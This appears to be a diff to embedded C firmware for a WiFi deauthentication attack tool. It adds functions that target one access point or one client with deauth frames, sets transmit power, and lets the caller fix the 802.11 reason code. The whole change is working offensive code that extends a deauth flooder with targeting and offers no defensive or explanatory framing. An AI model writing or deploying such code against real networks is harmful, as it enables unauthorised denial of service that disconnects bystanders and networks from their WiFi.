@@ -49,6 +49,7 @@ static wifi_prng_t s_prng;
 static uint8_t     s_frame[AUTH_FRAME_LEN];
 static uint16_t    s_seq;
 static uint8_t     s_attack_ch;
+static uint16_t    s_fixed_reason = 0;   /* 0 = use rotating k_reasons[] */
 
 static const uint8_t k_broadcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
 
@@ -124,6 +125,7 @@ static void sniff_start_channel(void) {
 /* ── Attack helpers ──────────────────────────────────────────────────────── */
 
 static uint16_t random_reason(void) {
+    if (s_fixed_reason) return s_fixed_reason;
     return k_reasons[wifi_prng_next(&s_prng) % N_REASONS];
 }
 
@@ -195,11 +197,39 @@ void deauth_svc_reset(void) {
     s_sniff_ch_count = 0;
     s_sniff_ch_idx   = 0;
     s_sniff_start_ms = 0;
+    s_fixed_reason   = 0;
     s_log_head  = 0;
     s_log_count = 0;
     s_log_dirty = false;
     memset(s_aps,     0, sizeof(s_aps));
     memset(s_clients, 0, sizeof(s_clients));
+}
+
+void deauth_svc_set_reason(uint16_t reason) { s_fixed_reason = reason; }
+
+void deauth_svc_attack_client(const uint8_t bssid[6], const uint8_t client[6],
+                               uint8_t channel) {
+    deauth_svc_reset();
+    memcpy(s_aps[0].ap.bssid, bssid, 6);
+    s_aps[0].ap.channel = channel;
+    s_aps[0].ap.ssid[0] = '\0';
+    s_aps[0].selected   = true;
+    s_ap_count          = 1;
+    s_broadcast_sel     = false;
+    memcpy(s_clients[0].mac, client, 6);
+    s_clients[0].selected = true;
+    s_client_count        = 1;
+    bs_wifi_set_tx_power(20);
+    wifi_pps_init(&s_pps);
+    wifi_prng_seed(&s_prng, s_arch->millis() ^ 0xDEA7CAFEu);
+    s_seq       = (uint16_t)(s_arch->millis() & 0xFFF);
+    s_attack_ch = 0;
+    bs_wifi_set_channel(channel);
+    char bmac[18], cmac[18];
+    bs_wifi_bssid_str(bssid,   bmac);
+    bs_wifi_bssid_str(client,  cmac);
+    svc_log("Client deauth %s<->%s ch.%d", bmac, cmac, (int)channel);
+    s_state = DEAUTH_SVC_ATTACKING;
 }
 
 /* ── Transitions ─────────────────────────────────────────────────────────── */
@@ -220,6 +250,25 @@ void deauth_svc_attack_broadcast(uint8_t channel) {
     s_attack_ch = 0;
     bs_wifi_set_channel(channel);
     svc_log("Broadcast deauth on ch.%d", (int)channel);
+    s_state = DEAUTH_SVC_ATTACKING;
+}
+
+void deauth_svc_attack_bssid(const uint8_t bssid[6], uint8_t channel) {
+    deauth_svc_reset();
+    memcpy(s_aps[0].ap.bssid, bssid, 6);
+    s_aps[0].ap.channel = channel;
+    s_aps[0].ap.ssid[0] = '\0';
+    s_aps[0].selected   = true;
+    s_ap_count          = 1;
+    s_broadcast_sel     = true;
+    bs_wifi_set_tx_power(20);
+    wifi_pps_init(&s_pps);
+    wifi_prng_seed(&s_prng, s_arch->millis() ^ 0xDEA7CAFEu);
+    s_seq       = (uint16_t)(s_arch->millis() & 0xFFF);
+    s_attack_ch = 0;
+    bs_wifi_set_channel(channel);
+    char mac[18]; bs_wifi_bssid_str(bssid, mac);
+    svc_log("Targeted deauth %s ch.%d", mac, (int)channel);
     s_state = DEAUTH_SVC_ATTACKING;
 }
 
